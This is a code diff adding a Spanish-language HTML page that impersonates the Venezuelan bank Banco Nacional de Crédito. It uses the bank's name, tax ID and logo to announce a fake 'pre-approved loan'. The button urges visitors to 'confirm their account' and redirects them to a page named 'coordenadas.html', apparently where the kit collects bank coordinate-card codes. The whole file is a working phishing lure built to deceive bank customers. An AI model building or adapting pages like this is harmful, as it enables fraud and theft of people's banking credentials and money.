@@ -1,0 +1,199 @@
+<html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Préstamo Pre-Aprobado - BNC</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&amp;display=swap" rel="stylesheet">
+    <style>
+
+.navbar-brand {
+    height: 60px;
+    width: auto;
+    margin: 5px 0 5px 0 !important;
+}
+
+
+.container img {
+    width: 100px;
+    margin-bottom: 20px;
+    border-radius: 50%;
+    border: 3px solid #28a745;
+}
+
+        body {
+            font-family: Poppins, Helvetica, Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            overflow: hidden; /* Para ocultar el confeti fuera de la pantalla */
+        }
+
+        .container {
+            background-color: rgba(0, 28, 77, 0.9);
+            width: 100%;
+            max-width: 480px;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            z-index: 1; /* Asegura que el contenedor esté por encima del confeti */
+            position: relative; /* Necesario para el z-index */
+        }
+
+        .container h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .container p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        button[type="button"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #28a745;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button[type="button"]:hover {
+            background-color: #218838;
+        }
+
+        footer {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
+            text-align: center;
+            padding: 10px;
+            background-color: rgba(255, 255, 255, 0.8);
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        footer p {
+            margin-bottom: 5px;
+        }
+
+        .confetti {
+            position: absolute;
+            top: -10px; /* Comienza desde un poco arriba de la pantalla */
+            width: 12px; /* Tamaño fijo para pixelar el confeti */
+            height: 12px; /* Tamaño fijo para pixelar el confeti */
+            opacity: 0.8;
+            pointer-events: none; /* Evitar que el confeti interfiera con los eventos del ratón */
+            animation: fall linear forwards, fade 1s forwards; /* Animaciones de caída y desvanecimiento */
+            border-radius: 3px; /* Esquinas redondeadas para un look más suave */
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(100vh); /* Caer a lo largo de toda la altura de la ventana */
+            }
+        }
+
+        @keyframes fade {
+            to {
+                opacity: 0; /* Desvanecerse al final de la animación */
+            }
+        }
+
+        /* Estilo para la imagen */
+        .container img {
+            max-width: 80%; /* Limitar el tamaño máximo de la imagen */
+            height: auto; /* Mantener la relación de aspecto */
+            margin-bottom: 20px; /* Espacio entre la imagen y el texto */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container-fluid LogoPL col-12 col-md-10 offset-md-1 col-lg-12 offset-lg-0" bis_skin_checked="1" style="
+    width: 100%;
+    padding-right: 15px;
+    padding-left: 15px;
+    margin-right: auto;
+    margin-left: auto;
+">
+        <div class="navbar-header logo-content" bis_skin_checked="1" style="
+    position: relative;
+    top: -30px;
+">
+        <img src="bnnc.png" alt="" class="navbar-brand u-header__navbar-brand u-header__navbar-brand-center">
+        </div>
+        <div class="collapse navbar-collapse" id="myNavbar" bis_skin_checked="1">
+        
+        </div>
+        </div>
+
+    <div class="container">
+        <img src="aprobado.png" alt="Logo BNC"> <!-- Asegúrate de que esta sea la ruta correcta -->
+        <h2>¡Préstamo Pre-Aprobado!</h2>
+        <p>Su préstamo ha sido pre-aprobado.</p>
+        <p>Confirme su cuenta para validar su préstamo y recibir el monto aprobado de forma inmediata.</p>
+        <button type="button" onclick="validateAccount()" style="
+    font-family: Poppins, Helvetica, Arial, sans-serif;
+">Confirmar Mi Préstamo </button>
+    </div>
+
+    <footer>
+        <p>Banco Nacional de Crédito, Banco Universal.<br>Rif: J-30984132-7 © 2024 | BNC Versión: 1.18</p>
+        <p>Todos los derechos reservados.</p>
+    </footer>
+
+    <script>
+        function createConfetti() {
+            const colors = ['#FFD700', '#FF6347', '#4682B4', '#32CD32', '#FF4500'];
+            const confettiCount = 100;
+            const confettiContainer = document.body;
+
+            for (let i = 0; i < confettiCount; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.width = Math.random() * 10 + 6 + 'px'; // Ancho variable para un aspecto pixelado
+                confetti.style.height = Math.random() * 10 + 6 + 'px'; // Alto variable para un aspecto pixelado
+                confetti.style.opacity = Math.random() * 0.5 + 0.5; // Opacidad aleatoria
+                confetti.style.animationDuration = (Math.random() * 2 + 3) + 's'; // Duración aleatoria
+                confetti.style.transform = `rotate(${Math.random() * 360}deg)`; // Rotación aleatoria
+                confettiContainer.appendChild(confetti);
+
+                // Eliminar confetti después de que caiga
+                setTimeout(() => {
+                    confetti.remove();
+                }, 5000);
+            }
+        }
+
+        // Crear confeti en el inicio
+        window.onload = function() {
+            createConfetti(); // Llama a la función de confeti
+        };
+
+        function validateAccount() {
+            alert("Procediendo a la validación de su cuenta.");
+            window.location.href = "coordenadas.html"; // Redirección a la página de validación
+        }
+    </script>
+
+
+
+</body></html>
